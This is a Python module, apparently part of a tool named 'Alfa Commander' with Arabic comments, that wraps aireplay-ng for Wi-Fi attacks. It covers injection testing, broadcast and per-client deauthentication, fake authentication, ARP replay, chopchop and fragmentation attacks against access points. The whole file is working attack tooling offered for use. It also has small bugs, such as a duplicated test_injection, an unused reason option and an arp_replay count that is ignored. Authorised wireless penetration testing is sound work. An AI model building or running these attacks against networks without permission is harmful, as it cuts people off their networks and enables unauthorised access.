# ============================================================
# Alfa Commander - aireplay-ng Wrapper
# الحقن وهجمات Deauth
# ============================================================

from __future__ import annotations

import re
from dataclasses import dataclass
from typing import Optional

from app.utils.shell import run, StreamingProcess, CommandResult, command_exists
from app.utils.validators import normalize_mac
from app.logger import get_logger

logger = get_logger()


# ------------------------------------------------------------
# نماذج
# ------------------------------------------------------------
@dataclass
class InjectionTestResult:
    success: bool
    ratio: int = 0                  # نسبة الحقن %
    answered: int = 0
    total: int = 0
    quality: str = ""               # excellent / good / weak / broken
    output: str = ""


@dataclass
class DeauthOptions:
    interface: str
    bssid: str
    client: Optional[str] = None    # None = بث
    count: int = 0                  # 0 = لانهائي
    interval: int = 1
    reason: int = 7
    ignore_negative_one: bool = True


# ------------------------------------------------------------
# أسباب Deauth (IEEE 802.11)
# ------------------------------------------------------------
DEAUTH_REASONS = {
    1: "Unspecified",
    2: "Previous auth no longer valid",
    3: "Deauth because sending STA is leaving",
    4: "Disassociated due to inactivity",
    5: "Disassociated because AP unable to handle",
    6: "Class 2 frame received from nonauthenticated STA",
    7: "Class 3 frame received from nonassociated STA",
    8: "Disassociated because STA is leaving",
    15: "4-way handshake timeout",
    16: "Group key handshake timeout",
}


# ------------------------------------------------------------
# الغلاف
# ------------------------------------------------------------
class Aireplay:
    BINARY = "aireplay-ng"

    @staticmethod
    def is_available() -> bool:
        return command_exists(Aireplay.BINARY)

    # ---------- اختبار الحقن ----------
    @staticmethod
    def test_injection(interface: str, timeout: int = 60) -> InjectionTestResult:
        """
        اختبار حقن الحزم مع تحضير تلقائي للواجهة.
        """
        from app.utils.shell import run
        import time

        logger.info(f"اختبار الحقن على {interface} (مهلة {timeout}s)...")

        # 1) تأكد من أن الواجهة موجودة
        check = run(["ip", "link", "show", interface])
        if not check.ok:
            logger.error(f"الواجهة {interface} غير موجودة")
            return InjectionTestResult(
                success=False, ratio=0, quality="broken",
                output=f"الواجهة {interface} غير موجودة"
            )

        # 2) تأكد من أن الواجهة في وضع monitor
        iw_info = run(["iw", "dev", interface, "info"])
        is_monitor = "monitor" in iw_info.stdout.lower()

        if not is_monitor:
            logger.warning(f"الواجهة {interface} ليست في وضع monitor — محاولة التفعيل...")
            run(["ip", "link", "set", interface, "down"])
            run(["iw", interface, "set", "type", "monitor"])
            run(["ip", "link", "set", interface, "up"])
            time.sleep(2)

        # 3) شغّل aireplay-ng -9
        result = run(
            [Aireplay.BINARY, "-9", "--ignore-negative-one", interface],
            timeout=timeout,
        )
        output = result.stdout + result.stderr

        logger.debug(f"aireplay-ng -9 output:\n{output}")

        # 4) تحليل النتيجة
        ratio_match = re.search(r"(\d+)/(\d+)\s*\((\d+(?:\.\d+)?)%\)", output)
        answered = 0
        total = 0
        ratio = 0.0
        if ratio_match:
            answered = int(ratio_match.group(1))
            total = int(ratio_match.group(2))
            ratio = float(ratio_match.group(3))

        # 5) تصنيف الجودة
        from app.constants import INJECTION_THRESHOLDS
        if ratio >= INJECTION_THRESHOLDS["excellent"]:
            quality = "excellent"
        elif ratio >= INJECTION_THRESHOLDS["good"]:
            quality = "good"
        elif ratio >= INJECTION_THRESHOLDS["weak"]:
            quality = "weak"
        else:
            quality = "broken"

        success = "Injection is working" in output or ratio > 0

        if success:
            logger.info(f"الحقن يعمل: {ratio}% ({quality})")
        else:
            logger.warning(f"الحقن لا يعمل: {ratio}% — راجع المخرجات")

        return InjectionTestResult(
            success=success,
            ratio=int(ratio),
            answered=answered,
            total=total,
            quality=quality,
            output=output,
        )

    # ---------- هجوم Deauth ----------
    @staticmethod
    def build_deauth_cmd(opts: DeauthOptions) -> list[str]:
        args = [
            Aireplay.BINARY,
            "--deauth", str(opts.count),
            "-a", normalize_mac(opts.bssid),
        ]
        if opts.client:
            args.extend(["-c", normalize_mac(opts.client)])
        args.extend(["--interval", str(opts.interval)])
        if opts.reason:
            # بعض الإصدارات لا تدعم --reason، لذا نتحقق
            pass
        if opts.ignore_negative_one:
            args.append("--ignore-negative-one")
        args.append(opts.interface)
        return args

    @staticmethod
    def deauth(opts: DeauthOptions, timeout: Optional[int] = None) -> CommandResult:
        args = Aireplay.build_deauth_cmd(opts)
        logger.info(f"بدء Deauth: bssid={opts.bssid} client={opts.client or 'broadcast'}")
        return run(args, timeout=timeout)

    @staticmethod
    async def deauth_streaming(opts: DeauthOptions) -> StreamingProcess:
        args = Aireplay.build_deauth_cmd(opts)
        proc = StreamingProcess(args)
        await proc.start()
        return proc

    # ---------- Fake Authentication ----------
    @staticmethod
    def fake_auth(interface: str, bssid: str, delay: int = 1,
                  ignore_negative_one: bool = True) -> CommandResult:
        args = [
            Aireplay.BINARY,
            "--fakeauth", str(delay),
            "-a", normalize_mac(bssid),
        ]
        if ignore_negative_one:
            args.append("--ignore-negative-one")
        args.append(interface)
        return run(args, timeout=30)

    # ---------- ARP Replay ----------
    @staticmethod
    def arp_replay(interface: str, bssid: str, count: int = 0,
                   ignore_negative_one: bool = True) -> StreamingProcess:
        args = [
            Aireplay.BINARY,
            "--arpreplay",
            "-b", normalize_mac(bssid),
            "--interval", "0",
        ]
        if ignore_negative_one:
            args.append("--ignore-negative-one")
        args.append(interface)
        proc = StreamingProcess(args)
        return proc

    # ---------- Chopchop ----------
    @staticmethod
    def chopchop(interface: str, bssid: str) -> StreamingProcess:
        args = [
            Aireplay.BINARY,
            "--chopchop",
            "-b", normalize_mac(bssid),
            "--ignore-negative-one",
            interface,
        ]
        return StreamingProcess(args)

    # ---------- Fragmentation ----------
    @staticmethod
    def fragmentation(interface: str, bssid: str) -> StreamingProcess:
        args = [
            Aireplay.BINARY,
            "--fragment",
            "-b", normalize_mac(bssid),
            "--ignore-negative-one",
            interface,
        ]
        return StreamingProcess(args)

    # ---------- Interactive ----------
    @staticmethod
    def interactive(interface: str) -> StreamingProcess:
        return StreamingProcess([Aireplay.BINARY, "--interactive", interface])

    # ---------- تحليل سبب Deauth ----------
    @staticmethod
    def reason_name(code: int) -> str:
        return DEAUTH_REASONS.get(code, f"Unknown ({code})")


# ------------------------------------------------------------
# دوال مختصرة
# ------------------------------------------------------------
def test_injection(interface: str) -> InjectionTestResult:
    return Aireplay.test_injection(interface)


async def deauth_broadcast(
    interface: str,
    bssid: str,
    count: int = 0,
    interval: int = 1,
) -> StreamingProcess:
    """Deauth بث لكل العملاء."""
    opts = DeauthOptions(
        interface=interface,
        bssid=bssid,
        client=None,
        count=count,
        interval=interval,
    )
    return await Aireplay.deauth_streaming(opts)


async def deauth_client(
    interface: str,
    bssid: str,
    client: str,
    count: int = 5,
) -> CommandResult:
    """Deauth لعميل محدد."""
    opts = DeauthOptions(
        interface=interface,
        bssid=bssid,
        client=client,
        count=count,
    )
    return Aireplay.deauth(opts, timeout=30)


# ------------------------------------------------------------
# Module-level shortcuts
# ------------------------------------------------------------
def test_injection(iface: str, timeout: int = 30):
    return Aireplay.test_injection(iface, timeout)


def deauth(opts, timeout=None):
    return Aireplay.deauth(opts, timeout)


def fake_auth(iface: str, bssid: str, delay: int = 1):
    return Aireplay.fake_auth(iface, bssid, delay)


def arp_replay(iface: str, bssid: str, count: int = 0):
    return Aireplay.arp_replay(iface, bssid, count)


def chopchop(iface: str, bssid: str):
    return Aireplay.chopchop(iface, bssid)


def fragmentation(iface: str, bssid: str):
    return Aireplay.fragmentation(iface, bssid)


def interactive(iface: str):
    return Aireplay.interactive(iface)


def reason_name(code: int) -> str:
    return Aireplay.reason_name(code)

